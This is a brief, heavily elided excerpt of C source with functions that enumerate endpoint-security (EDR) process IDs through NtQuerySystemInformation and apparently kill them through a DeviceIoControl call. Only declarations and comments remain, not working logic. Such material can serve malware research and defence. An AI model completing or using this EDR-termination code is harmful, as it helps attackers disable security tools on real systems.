...
BOOL EnumerateEDRProcessesPID(OUT PPROCESS_ENTRY* ppProcessList, OUT DWORD* pdwProcessCount) {
	...
	NTSTATUS						STATUS				= 0;	// Store NTSTATUS value
	HANDLE							hGetProcessHeap		= NULL;	// Handle to process heap
	ULONG							uReturnLen1			= 0;	// Stores the size of system information 1st NtQuerySystemInformation call
	ULONG							uReturnLen2			= 0;	// Stores size of system information 2nd NtQuerySystemInformation call
	...
	pNtQuerySystemInformation(
		...
		0,							// Can be 0 the first time calling
...
BOOL KillEdrProcesses() {
	...
	BOOL			bIoctlSuccess	= FALSE; // Save the DeviceIOControl status
	DWORD			dwPID			= 0;	// Stores the EDR PID
